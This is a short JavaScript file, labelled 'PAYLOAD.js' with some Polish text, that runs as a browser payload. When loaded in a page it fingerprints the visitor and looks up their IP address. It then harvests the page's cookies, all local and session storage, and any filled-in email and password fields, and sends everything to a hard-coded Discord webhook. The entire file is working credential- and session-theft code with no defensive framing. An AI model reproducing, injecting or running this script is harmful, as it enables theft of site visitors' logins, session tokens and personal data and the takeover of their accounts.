(async () => {
  const WEBHOOK = "https://discord.com/api/webhooks/1355611891434782800/dr5QNXmfpceY1eNmx4ug-1qqGM1MctBkN2kYUauetYNEsCLSBEu0eU0OqzAP6mjeVT3u";

  try {
    const fp = await FingerprintJS.load().then(f => f.get());
    const ip = await fetch("https://api.ipify.org/?format=json")
      .then(res => res.json())
      .then(data => data.ip)
      .catch(() => "Brak IP");

    const cookies = document.cookie || "Brak";
    const localData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
    const sessionData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)));

    let autofill = "";
    document.querySelectorAll("input").forEach(input => {
      if (input.value && (input.type === "email" || input.type === "password")) {
        autofill += `• ${input.type}: ${input.value}\n`;
      }
    });

    const msg = `**PAYLOAD.js 🔴**
**Fingerprint:** ${fp.visitorId}
**IP:** ${ip}
**User-Agent:** ${navigator.userAgent}
**Platform:** ${navigator.platform}
**Resolution:** ${screen.width}x${screen.height}
**RAM:** ${navigator.deviceMemory || "?"} GB
**CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
**Cookies:** ${cookies}

**LocalStorage:**\n${localData}
**SessionStorage:**\n${sessionData}
**Autofill:**\n${autofill || "Brak wartości"}
`;

    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: msg })
    });

  } catch (e) {
    console.error("Payload error:", e.message);
  }
})();
